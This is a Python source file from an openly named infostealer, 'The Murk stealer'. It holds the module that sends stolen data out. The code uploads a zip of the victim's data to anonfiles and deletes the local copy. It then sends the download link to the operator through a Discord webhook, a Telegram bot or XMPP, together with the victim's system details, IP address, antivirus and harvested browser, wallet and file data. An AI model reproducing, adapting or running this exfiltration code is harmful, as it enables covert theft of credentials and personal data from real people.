#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from discord_webhook import DiscordWebhook
from anonfile import AnonFile
import requests
import xmpp
import os


def Send(type,np,data,dataB,dataO,dataW,dataF,discordData,TelegramData,xmppData):

	try:
		try:
			file = AnonFile()
			uploadedFile = file.upload(rf'{np[0]}.zip')
			url = uploadedFile.url.geturl()
		except:
			num = np[0].rfind("\\")
			name = np[0][num+1:]
			arr = open(rf'{np[0]}.zip', 'rb')
			files = {
    			'file': (f'{name}.zip', arr),
			}
			url = 'https://api.anonfiles.com/upload'
			response = requests.post(url, files=files)
			data = response.json()
			url = data['data']['file']['url']['short']
			arr.close()
		try:
			os.remove(f'{np[0]}.zip')
		except:
			pass
		print(url)
		try:
			if type == 0:
				title = f"▀▀█▀▀ █──█ █▀▀ 　 ░█▀▄▀█ █──█ █▀▀█ █─█ 　 █▀▀█ █▀▀ █▀▀ █──█ █── ▀▀█▀▀ █▀▀\n─░█── █▀▀█ █▀▀ 　 ░█░█░█ █──█ █▄▄▀ █▀▄ 　 █▄▄▀ █▀▀ ▀▀█ █──█ █── ──█── ▀▀█\n─░█── ▀──▀ ▀▀▀ 　 ░█──░█ ─▀▀▀ ▀─▀▀ ▀─▀ 　 ▀─▀▀ ▀▀▀ ▀▀▀ ─▀▀▀ ▀▀▀ ──▀── ▀▀▀\n[Link🔗]({url})\nPassword: ||{np[1]}||\n\n>>> **Collected data**"
			if type == 1 or type == 2:
				title = f"▀▀█▀▀ █──█ █▀▀ 　 ░█▀▄▀█ █──█ █▀▀█ █─█\n─░█── █▀▀█ █▀▀ 　 ░█░█░█ █──█ █▄▄▀ █▀▄ \n─░█── ▀──▀ ▀▀▀ 　 ░█──░█ ─▀▀▀ ▀─▀▀ ▀─▀\nLink🔗:{url}\nPassword: {np[1]}\n\n⇓Collected data⇓"
			message = f"{title}"+f'\n⏲Date: {data[0]}\n🖥System: {data[1]}\n👤PCname: {data[2]}\n👤Username: {data[3]}\n🔧CPU: {data[4]}\n🔧GPU: {data[5]}\n📡IP: {data[6]}\n🛡Antivirus: {data[7]}'
			if dataB:
				for text in dataB:
					message+= text
			message+="\n\n🎰Other"
			if dataO:
				for text in dataO:
					message+= text
			if dataW:
				for text in dataW:
					message+= text
			if dataF:
				for text in dataF:
					message+= text
		except:
			pass
		try:
			if type == 0:
				urlWebHook = discordData[0] # url of your WebHook
				botName = discordData[1] # name of that WebHook
				message+="\n\n\n**The Murk|by Nick Vinesmoke**"
				message+="\n@everyone"
				hook = DiscordWebhook(url=urlWebHook, username=botName,content=message)
				response = hook.execute()
			if type == 1:
				Token = TelegramData[0] # HTTPAPI that you got from botFather
				ID = TelegramData[1] # your chat ID
				message+="\n\n\nThe Murk|by Nick Vinesmoke"
				params = {
    				'chat_id': ID,
    				'text': message,
				}
				response = requests.get('https://api.telegram.org/bot'+Token+'/sendMessage', params=params)
			if type == 2:
				jabberid = xmppData[0]
				jabberpassword = xmppData[1]
				jabberreceiver = xmppData[2]
				message+="\n\n\nThe Murk|by Nick Vinesmoke"
				jid = xmpp.protocol.JID(jabberid)
				connection = xmpp.Client(server=jid.getDomain())
				connection.connect()
				connection.auth(user=jid.getNode(), password=jabberpassword, resource=jid.getResource())
				connection.send(xmpp.protocol.Message(to=jabberreceiver, body=message))
		except:
			pass
	except:
		pass
